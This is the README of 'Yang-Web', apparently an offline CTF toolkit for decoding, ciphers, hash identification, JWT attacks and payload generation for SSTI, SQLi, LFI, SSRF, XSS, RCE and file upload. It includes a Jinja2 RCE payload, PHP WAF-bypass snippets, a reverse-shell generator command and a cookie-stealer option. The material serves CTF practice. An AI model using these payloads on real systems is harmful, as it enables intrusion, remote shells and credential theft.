# Yang-Web 🛠️

> **CTF 一站式工具箱** — 智能解码 + 34种密码/编码 + JWT攻击 + Payload库 + GUI图形界面

[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-green.svg)]()
[![GUI](https://img.shields.io/badge/GUI-tkinter-purple.svg)]()
[![Ciphers](https://img.shields.io/badge/ciphers-34-orange.svg)]()
[![Scripts](https://img.shields.io/badge/scripts-41-red.svg)]()

---

## 📖 简介

Yang-Web 是一把 **CTF 全方向的瑞士军刀**，覆盖从编码解码、密码破解、Payload 生成到攻击利用的完整流程。内置 **图形界面 (GUI)**，支持 CLI ↔ GUI 一键切换。所有功能**完全离线**运行，零第三方依赖。

**15 个子命令 + 智能解码器(14种编码自动识别) + 34种密码/编码(Base全系+古典) + 41个内嵌CTF脚本 + JWT攻击链 + Payload库，一套工具搞定 CTF 编码/密码/Web 三道题。**

## ✨ 核心优势

- 📴 **完全离线** — 零 pip 依赖，Python 标准库一把梭
- 🧠 **智能解码器** — 粘贴即用：自动识别14种编码 + 一键解码 + 暴力全试 + 链式递归解码
- 🔐 **34种密码/编码** — 基础编码(Base64/32/16/58/85/URL/HTML/Unicode/二进制/八进制/十进制) + 古典密码(凯撒/栅栏/猪圈/培根/Vigenère/ADFGX/摩斯等) + 键盘映射 + 中文编码
- 📦 **内嵌脚本库** — 41 个 CTF 脚本（Crypto/Web/Misc/Reverse），一键调用
- 🖥️ **图形界面** — GUI ↔ CLI 一键切换，即看即用的密码参考图轮播
- 🎯 **Payload 全覆盖** — SSTI/SQLi/LFI/SSRF/XSS/RCE/PHP/Upload 八大攻击面
- 🛡️ **WAF 绕过** — 30+ 种 SQL WAF 绕过 + 12 类 PHP RCE 绕过
- 🔑 **JWT 攻击链** — 解析→None 攻击→弱密钥爆破→伪造令牌
- 📡 **离线扫描** — 300+ 目录/文件词库，断网照样扫

---

## 📦 安装

```bash
# pip 安装（推荐）
pip install yang-web

# 或从 GitHub
pip install git+https://github.com/Yang-afk825/Yang-web.git

# 或直接运行（无需安装）
git clone https://github.com/Yang-afk825/Yang-web.git
cd Yang-web
python -m yang_web
```

---

## 📋 14 个子命令详解

### 1. 智能解码 `decode`

自动检测编码格式并链式解码，直到还原明文。支持 **base64/32/16/58/85、URL 编码、HTML 实体、ROT13、二进制/八进制/十进制 ASCII、Unicode 转义、摩斯电码**。

```bash
# 单层解码
$ yang-web decode "ZmxhZ3t0ZXN0fQ=="
→ flag{test}

# 链式解码（自动递归）
$ yang-web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="
Step 1: base64  → 526f626f742065617379
Step 2: base16  → Robot easy
✅ 最终: Robot easy

# 暴力尝试所有解码器
$ yang-web decode --brute "dGVzdA=="
```

**适用场景**：你拿到一段乱码/编码字符串，不知道是什么编码 → 直接丢进来

---

### 2. 编码 `encode`

反向操作，把明文编码成指定格式。

```bash
$ yang-web encode base64 "hello world"
$ yang-web encode url "admin' OR 1=1--"
$ yang-web encode rot13 "flag"
```

**适用场景**：构造 Payload 时需要把特殊字符编码绕过 WAF

---

### 3. SSTI 模板注入 `ssti`

覆盖 **8 种模板引擎**：Jinja2 (Flask)、Twig (Symfony)、Smarty (PHP)、Mako (Python)、ERB (Ruby)、FreeMarker (Java)、Velocity (Java)、Django。

```bash
# 列出所有引擎
$ yang-web ssti --list

# 检测 Payload（看哪个引擎有反应）
$ yang-web ssti --detect --engine "Jinja2"

# 利用 Payload — 直接 RCE
$ yang-web ssti --exploit --engine "Jinja2"
• RCE: {{ cycler.__init__.__globals__.os.popen('id').read() }}
• 文件读取: {{ ''.__class__.__mro__[1].__subclasses__()... }}

# 过滤绕过技巧
$ yang-web ssti --bypass --engine "Twig"
```

**适用场景**：Web 页面输入 `{{7*7}}` 返回 `49` → 确认 SSTI → 用此命令生成 RCE Payload

---

### 4. SQL 注入 `sqli`

覆盖 **MySQL/PostgreSQL/MSSQL/Oracle/SQLite** 五大数据库的完整攻击链。

```bash
# 查看支持的所有数据库
$ yang-web sqli --list

# 显示检测 Payload（闭合探测/列数/回显位/指纹）
$ yang-web sqli --detect

# 获取指定数据库的利用 Payload
$ yang-web sqli --db MySQL
• 报错注入: updatexml / extractvalue / floor / exp (10种)
• 时间盲注: sleep / benchmark / get_lock / 笛卡尔积
• 堆叠注入: show / handler / 预编译
• 无列名注入: 别名法 / join法 / 反引号下标
• information_schema 被禁: innodb_table_stats / sys.schema
• INSERT/UPDATE/DELETE 注入

# 查看盲注逐字符提取模板
$ yang-web sqli --blind

# 🆕 WAF 绕过技巧 (30+ 种)
$ yang-web sqli --waf              # 全部显示
$ yang-web sqli --waf 空白符绕过     # 按分类查看
```

**WAF 绕过技巧一览**：

| 分类 | 手法数 | 示例 |
|------|:---:|------|
| 关键字变形 | 6种 | 双写、大小写、反引号、注释穿插、内联版本注释 |
| 逻辑等价 | 6种 | or→\|\|、and→&&、浮点绕过、科学计数法 |
| 编码绕过 | 8种 | URL/双重URL/Unicode/HTML实体/hex/char/base64/unhex |
| 空白符绕过 | 7种 | %09/%0a/%0b/%0c/%0d/%a0/括号替代 |
| 函数替换 | 8种 | substr→mid、if→case when、strcmp/greatest/coalesce |
| 宽字节注入 | 3种 | %df%27、%81%27、高阶宽字节 |

**适用场景**：从发现注入点到拿到数据一步到位

---

### 5. LFI / 文件包含 `lfi`

路径遍历 Payload 和 PHP 伪协议利用。

```bash
# 路径遍历 Payload
$ yang-web lfi --traversal

# Linux 敏感文件
$ yang-web lfi --linux

# Windows 敏感文件
$ yang-web lfi --windows

# PHP 伪协议（filter/wrapper/data/input/expect）
$ yang-web lfi --php

# PHP filter chain 生成器
$ yang-web lfi --filter-chain
```

**适用场景**：`?page=index.php` → LFI 漏洞 → 读源码 / 日志污染→RCE

---

### 6. SSRF `ssrf`

云元数据地址 + 内网探测 + 协议利用。

```bash
# 云平台元数据（AWS/GCP/Azure/阿里云/腾讯云/DigitalOcean）
$ yang-web ssrf --cloud aws

# 内网地址段
$ yang-web ssrf --internal

# 协议利用（gopher/dict/file）
$ yang-web ssrf --protocol

# Bypass 技巧
$ yang-web ssrf --bypass
```

**适用场景**：`?url=http://xxx` → SSRF → 打内网 / 读云元数据

---

### 7. XSS `xss`

反射型 XSS 检测 / 窃取 / 绕过。

```bash
# 检测 Payload
$ yang-web xss --detect

# Cookie 窃取器
$ yang-web xss --steal cookie

# 多维度绕过
$ yang-web xss --bypass

# 模板注入（AngularJS / Vue）
$ yang-web xss --template
```

---

### 8. 命令注入 RCE `rce`

命令注入 Payload + 7 种反弹 Shell 自动生成。

```bash
# 命令注入 Payload（链接符/空格/关键字绕过）
$ yang-web rce --inject

# 反弹 Shell（Bash/NC/Python/PHP/Perl/Ruby/PowerShell）
$ yang-web rce --shell bash --ip 10.0.0.1 --port 4444

# 生成定制反弹 Shell
$ yang-web rce --custom
```

**适用场景**：`?cmd=ping` → RCE → 一键生成反弹 Shell

---

### 9. PHP 技巧 `php`

Magic Hash × 27个、弱类型比较 × 14类、反序列化、**WAF 绕过 × 12类**。

```bash
# Magic Hash（MD5/SHA-1 的 0e 开头值）
$ yang-web php --magic

# 弱类型比较技巧
$ yang-web php --type-juggle

# 反序列化 Payload
$ yang-web php --deserialize

# RCE Bypass 技巧
$ yang-web php --rce

# 🆕 PHP WAF 绕过（12类）
$ yang-web php --waf-php
```

**PHP WAF 绕过一览**：

| 绕过类型 | 示例 |
|----------|------|
| 双写 | `eval → evaleval` |
| 大小写 | `Eval / eVaL` |
| 函数替换 | `eval → assert / preg_replace` |
| 可变函数 | `$_GET['a']($_GET['b'])` |
| 字符串拼接 | `$a='sy'.'stem'` |
| 编码执行 | `base64_decode / str_rot13` |
| 反斜杠分割 | `\s\y\s\t\e\m('id')` |
| create_function | `create_function('',$_GET['c'])` |
| call_user_func | `call_user_func('system','id')` |
| 数组绕过 | `$a[0]($a[1])` |
| disable_functions 绕过 | LD_PRELOAD / FFI / PHP-FPM |
| 无字母数字 | 位运算构造字符串 |

---

### 10. 🆕 文件上传 `upload`

全新模块！覆盖文件上传攻击的完整面。

```bash
# 后缀名绕过（黑名单/空格点/NTFS流/截断/超长后缀）
$ yang-web upload --ext

# Content-Type & 文件头伪造
$ yang-web upload --mime

# 图片马内容绕过（注释/短标签/编码/拼接/无函数）
$ yang-web upload --content

# 服务端解析漏洞（Nginx/Apache/IIS）
$ yang-web upload --parse nginx

# .htaccess / .user.ini 利用
$ yang-web upload --htaccess
$ yang-web upload --userini

# 高级技巧（条件竞争/二次渲染/SVG XXE）
$ yang-web upload --advanced
```

**适用场景**：上传头像/附件处 → 提示 "只能上传图片" → 一键获取各维度绕过方案

---

### 11. Hash 识别 `hashid`

自动识别 **40+ 种 Hash 算法**，给出算法名和格式类别。

```bash
$ yang-web hashid "e10adc3949ba59abbe56e057f20f883e"
🔍 长度: 32 字符
📊 可能: MD5 (3种) / NTLM / MD4 / Domain Cached Credentials

$ yang-web hashid "$2y$10$..."
📊 可能: bcrypt
```

---

### 12. JWT 分析攻击 `jwt`

一条命令完成 JWT 安全分析。

```bash
# 解析 JWT（不验证签名）
$ yang-web jwt "eyJhbGciOiJSUzI1NiIs..."

# None 算法攻击
$ yang-web jwt "eyJ..." --none

# 弱密钥爆破
$ yang-web jwt "eyJ..." --brute

# 已知密钥伪造（需提供 secret）
$ yang-web jwt "eyJ..." --forge --secret "mykey" --claim '{"admin":true}'
```

---

### 13. 离线目录扫描 `scan`

内置 300+ CTF 常用目录/文件词库，完全离线。

```bash
# 目录扫描
$ yang-web scan dir --search flag
$ yang-web scan dir --search config

# 文件扫描
$ yang-web scan file --search backup

# 列出所有词库
$ yang-web scan --list
```

---

### 14. 编码 `encode`

反向操作，明文 → 编码。

```bash
$ yang-web encode base64 "admin' OR 1=1-- "
$ yang-web encode url "id"
$ yang-web encode rot13 "flag"
```

---

### 15. 内嵌 CTF 脚本库 `scripts`

🆕 内置 **41 个 CTF 常用脚本**，分类覆盖 Crypto、Web、Misc、Reverse 四大方向。

```bash
# 列出所有 41 个脚本
$ yang-web scripts

# 按分类查看
$ yang-web scripts --category crypto      # 密码/编码 (17个)
$ yang-web scripts --category web          # Web 攻击 (9个)
$ yang-web scripts --category misc         # 杂项/Misc (14个)
$ yang-web scripts --category reverse      # 逆向 (1个)

# 搜索脚本
$ yang-web scripts --search rsa
$ yang-web scripts --search aes

# 运行脚本
$ yang-web scripts --run rsa_toolkit
$ yang-web scripts --run classic_crypto
$ yang-web scripts --run 'Base家族加解密'

# 依赖检查 & 安装
$ yang-web scripts --check-deps
$ yang-web scripts --install-deps
```

**脚本一览**：

| 分类 | 数量 | 代表脚本 |
|------|:---:|------|
| 🔐 密码/编码 | 17 | AES加解密、RSA攻击工具箱、Base64隐写、CRC32碰撞、MD5爆破、SM2、古典密码 |
| 🌐 Web | 9 | 布尔盲注、时间盲注、无字符RCE绕过、PHPInfo条件竞争LFI、SSH弱口令扫描 |
| 📦 杂项/Misc | 14 | 图片隐写分析、QR码工具、PCAP流量分析、ZIP分析、文件头分析器 |
| 🔧 逆向 | 1 | APK 逆向 Solver (SCM time-capsule → SHA256 → RC4) |

---

## 🔗 工作流示例

### 场景一：拿到一段密文

```bash
$ yang-web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="
# 自动检测→链式解码→得到明文
```

### 场景二：发现 SQL 注入

```bash
# 1. 探测
$ yang-web sqli --detect
# 2. 判断数据库 → 获取 Payload
$ yang-web sqli --db MySQL
# 3. 遇到 WAF → 查绕过
$ yang-web sqli --waf 关键字变形
$ yang-web sqli --waf 空白符绕过
# 4. 注入出数据 ✅
```

### 场景三：文件上传点

```bash
# 1. 先看后缀绕过
$ yang-web upload --ext
# 2. 配合内容绕过
$ yang-web upload --content
# 3. 看服务器解析漏洞
$ yang-web upload --parse apache
# 4. 都试过了 → 上高级技巧
$ yang-web upload --advanced
```

### 场景四：PHP 代码审计绕过

```bash
$ yang-web php --waf-php
# 按场景选：双写/大小写/可变函数/反斜杠...
$ yang-web php --rce
# 组合 disable_functions 绕过
```

---

## 🔐 Misc Crypto 密码面板 `gui`

🆕 GUI 专属功能：内置 **34 种** CTF 常见密码/编码类型，支持一键 Encode/Decode + 参考图片 + 说明文档。

```bash
# 启动图形界面
yang-web gui
```

### 密码类型一览

| 分类 | 密码/编码 | 编码 | 解码 | 参考图 |
|------|------|:--:|:--:|:--:|
| **基础编码** | Base64 | ✅ | ✅ | — |
| | Base32 / Base16(Hex) | ✅ | ✅ | — |
| | Base58(Bitcoin) / Base85 | ✅ | ✅ | — |
| | URL编码 / HTML实体 | ✅ | ✅ | — |
| | Unicode转义(\\u) | ✅ | ✅ | — |
| | 二进制 / 八进制 / 十进制ASCII | ✅ | ✅ | — |
| 古典替换 | 凯撒密码 / 埃特巴什码 / ROT13 | ✅ | ✅ | 🖼 |
| | 维吉尼亚密码 | ✅ | ✅ | 🖼×2 |
| | ADFGX 加密法 | ✅ | ✅ | 🖼 |
| 棋盘/坐标 | 波利比奥斯棋盘 / 猪圈密码 | ✅ | ✅ | 🖼 |
| | 培根密码 / 栅栏密码 | ✅ | ✅ | 🖼 |
| 键盘布局 | 电脑键盘 QWE 加密 | ✅ | ✅ | 🖼 |
| | 电脑键盘棋盘加密 | ✅ | ✅ | 🖼 |
| | 电脑键盘坐标加密 | ✅ | ✅ | 🖼 |
| | 手机键盘加密解密 | ✅ | ✅ | 🖼 |
| 中文编码 | 当铺密码 | ✅ | ✅ | 🖼 |
| | 杰斐逊转轮密码 | ✅ | ✅ | 📄 |
| 特殊编码 | 摩斯密码 | ✅ | ✅ | 🖼 |
| | 二进制加密 | ✅ | ✅ | 🖼 |
| | 倒序加密 | ✅ | ✅ | 🖼 |
| | 字母表顺序加密 | ✅ | ✅ | 🖼 |
| | 数字坐标加密 | ✅ | ✅ | 🖼 |
| | 标准银河字母 | ✅ | ✅ | 🖼 |
| | 非斯象形文字 | ✅ | ✅ | 🖼 |
| | 蓝孔打卡 | ✅ | ✅ | 🖼 |

**界面功能**：
- 🔍 分类筛选 + 关键字搜索
- 🖼 一键查看参考图片（系统图片查看器）
- 📋 当前密码详情/特征提示
- ⚡ 实时编码/解码（选择即用）

**适用场景**：拿到一段奇怪密文 → 打开 GUI → 选对应密码类型 → 一键解码

---

## 📂 项目结构

```
Yang-web/
├── pyproject.toml              # 项目配置
├── README.md                   # 本文档
├── LICENSE                     # MIT
├── yang_web/
│   ├── __init__.py
│   ├── __main__.py             # python -m 入口
│   ├── cli.py                  # 命令行界面（15个子命令）
│   ├── gui.py                  # 🖥️ 图形界面（GUI ↔ CLI 一键切换 + Misc Crypto 34 种密码面板 + 智能解码器）
│   ├── core/
│   │   ├── decoder.py          # 智能解码引擎（14种编码）
│   │   ├── hashid.py           # Hash 类型识别
│   │   ├── jwt.py              # JWT 解析与攻击
│   │   ├── misc_crypto.py      # 🔐 Misc Crypto 密码引擎（34种密码/编码）
│   │   └── utils.py            # 公共工具
│   ├── payloads/
│   │   ├── ssti.py             # SSTI Payload（8种引擎）
│   │   ├── sqli.py             # SQL 注入（5种数据库 + 30种WAF绕过）
│   │   ├── lfi.py              # LFI / 文件包含 / PHP伪协议
│   │   ├── ssrf.py             # SSRF（云元数据 + 协议利用）
│   │   ├── xss.py              # XSS Payload
│   │   ├── rce.py              # 命令注入 / 反弹Shell
│   │   ├── php.py              # PHP 技巧（Magic Hash / 弱类型 / WAF绕过）
│   │   └── upload.py           # 🆕 文件上传攻击
│   ├── scripts/                # 🆕 内嵌 CTF 脚本库（41个脚本）
│   │   ├── registry.py         # 脚本注册表
│   │   ├── runner.py           # 脚本执行引擎
│   │   ├── deps.py             # 依赖管理
│   │   ├── solver.py           # 一键解题引擎
│   │   └── *.py                # 41 个 CTF 脚本
│   └── wordlists/
│       └── data/
│           ├── dirs.txt        # 300+ CTF 常用目录
│           ├── files.txt       # 100+ CTF 常用文件
│           └── misc_crypto/    # 🔐 34 种密码参考图片 + 说明文档
└── tests/                      # 测试目录
```

---

## 🤝 贡献

欢迎提交 PR！常见贡献方向：
- 更多 Payload 和编码格式
- 新攻击模块
- 词库扩充
- Bug 修复

## 📮 联系

有想法的师傅可以联系我：3303257524@qq.com

## 📄 License

MIT License — 详见 [LICENSE](LICENSE)
